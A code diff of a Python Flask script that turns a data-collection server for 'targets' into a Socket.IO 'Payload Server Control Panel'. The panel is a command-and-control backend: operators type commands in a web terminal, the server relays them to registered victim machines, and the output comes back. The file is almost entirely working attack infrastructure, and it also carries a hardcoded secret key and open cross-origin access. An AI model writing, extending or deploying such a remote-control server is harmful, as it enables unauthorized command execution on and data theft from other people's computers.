@@ -1,85 +1,148 @@
 #!/usr/bin/env python3
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, render_template, request, jsonify
+from flask_socketio import SocketIO, emit
 import os
-import datetime
 import subprocess
+import datetime
 import threading
-import json
 
 app = Flask(__name__)
+app.config['SECRET_KEY'] = 'secret!'
+socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Connected targets ka record
-connected = []
+# Connected clients store
+connected_clients = []
+commands_history = []
 
 @app.route('/')
-def home():
+def index():
     return '''
     <!DOCTYPE html>
     <html>
-    <head><title>Custom Server Active</title></head>
-    <body style="font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px;">
-        <h2>🔥 Custom Server Running</h2>
-        <p>Status: <span style="color: #0f0;">● ONLINE</span></p>
-        <p>Time: {}</p>
-        <hr>
-        <p>📡 Endpoints:</p>
-        <ul>
-            <li><b>GET /ping</b> - Health check (for Uptime Robot)</li>
-            <li><b>GET /status</b> - Server status</li>
-            <li><b>POST /api/data</b> - Receive data from target</li>
-        </ul>
+    <head>
+        <title>Payload Server Control Panel</title>
+        <style>
+            body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
+            .terminal { background: #000; padding: 15px; border-radius: 5px; height: 400px; overflow-y: auto; }
+            .input-area { margin-top: 10px; }
+            input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 80%; }
+            button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }
+            .status { color: #0f0; }
+            .offline { color: #f00; }
+        </style>
+    </head>
+    <body>
+        <h2>🔥 Payload Server Active</h2>
+        <div id="status">Status: <span class="status">● Online</span></div>
+        <div id="clients">Connected Clients: 0</div>
+        <div class="terminal" id="terminal"></div>
+        <div class="input-area">
+            <input type="text" id="cmd" placeholder="Enter command...">
+            <button onclick="sendCommand()">Execute</button>
+        </div>
+        
+        <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+        <script>
+            var socket = io();
+            var clientId = null;
+            
+            socket.on('connect', function() {
+                addToTerminal('[+] Connected to server\\n');
+            });
+            
+            socket.on('client_connected', function(data) {
+                clientId = data.id;
+                document.getElementById('clients').innerHTML = 'Connected Clients: ' + data.total;
+                addToTerminal('[*] Target connected! ID: ' + data.id + '\\n');
+            });
+            
+            socket.on('command_output', function(data) {
+                addToTerminal('\\n$> ' + data.output + '\\n');
+            });
+            
+            socket.on('client_disconnected', function() {
+                addToTerminal('[-] Target disconnected\\n');
+                document.getElementById('clients').innerHTML = 'Connected Clients: 0';
+            });
+            
+            function addToTerminal(text) {
+                var term = document.getElementById('terminal');
+                term.innerHTML += text;
+                term.scrollTop = term.scrollHeight;
+            }
+            
+            function sendCommand() {
+                var cmd = document.getElementById('cmd').value;
+                if(cmd && clientId) {
+                    addToTerminal('\\n[CMD] ' + cmd + '\\n');
+                    socket.emit('execute_command', {command: cmd, client_id: clientId});
+                    document.getElementById('cmd').value = '';
+                }
+            }
+            
+            document.getElementById('cmd').addEventListener('keypress', function(e) {
+                if(e.key === 'Enter') sendCommand();
+            });
+        </script>
     </body>
     </html>
-    '''.format(datetime.datetime.now())
+    '''
+
+@socketio.on('connect')
+def handle_connect():
+    print(f'[+] Client connected: {request.remote_addr}')
+
+@socketio.on('register_client')
+def register_client(data):
+    client_info = {
+        'id': request.sid,
+        'ip': request.remote_addr,
+        'timestamp': str(datetime.datetime.now())
+    }
+    connected_clients.append(client_info)
+    emit('client_connected', {'id': request.sid, 'total': len(connected_clients)}, broadcast=True)
+    print(f'[+] Target registered: {request.sid}')
+
+@socketio.on('command_result')
+def handle_result(data):
+    print(f'[+] Command output received: {data["output"][:100]}')
+    emit('command_output', {'output': data['output']}, room=data.get('listener_id'))
+
+@socketio.on('execute_command')
+def execute_command(data):
+    # Send command to target
+    emit('run_command', {'command': data['command']}, room=data['client_id'])
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    for client in connected_clients:
+        if client['id'] == request.sid:
+            connected_clients.remove(client)
+            break
+    emit('client_disconnected', {'total': len(connected_clients)}, broadcast=True)
+    print(f'[-] Client disconnected: {request.sid}')
 
 @app.route('/ping')
 def ping():
-    '''Uptime Robot ke liye'''
     return 'OK', 200
 
-@app.route('/status')
+@app.route('/api/status')
 def status():
     return jsonify({
         'status': 'online',
-        'time': str(datetime.datetime.now()),
-        'connected': len(connected),
-        'port': os.environ.get('PORT', 8080)
+        'connected_clients': len(connected_clients),
+        'timestamp': str(datetime.datetime.now())
     })
-
-@app.route('/api/data', methods=['POST', 'GET'])
-def receive():
-    '''Target se data aayega yahan'''
-    if request.method == 'POST':
-        data = request.get_data()
-        client = request.remote_addr
-        
-        # Log kar
-        print(f"[{datetime.datetime.now()}] Data from {client}: {len(data)} bytes")
-        
-        # Save kar
-        with open(f'log_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt', 'wb') as f:
-            f.write(data)
-        
-        # Client ko record kar
-        if client not in connected:
-            connected.append(client)
-        
-        return 'Received', 200
-    
-    return jsonify({'message': 'Send POST request with data'})
-
-# Health check for Render
-@app.route('/health')
-def health():
-    return 'OK', 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     print(f"""
-    ╔══════════════════════════════════╗
-    ║   🚀 SERVER STARTED              ║
-    ║   Port: {port}                    ║
-    ║   Time: {datetime.datetime.now()} ║
-    ╚══════════════════════════════════╝
+    ╔══════════════════════════════════════╗
+    ║   🚀 WEBSOCKET SERVER READY         ║
+    ║   Port: {port}                        ║
+    ║   Time: {datetime.datetime.now()}     ║
+    ║                                      ║
+    ║   Control Panel: http://localhost:{port} ║
+    ╚══════════════════════════════════════╝
     """)
-    app.run(host='0.0.0.0', port=port)
+    socketio.run(app, host='0.0.0.0', port=port)
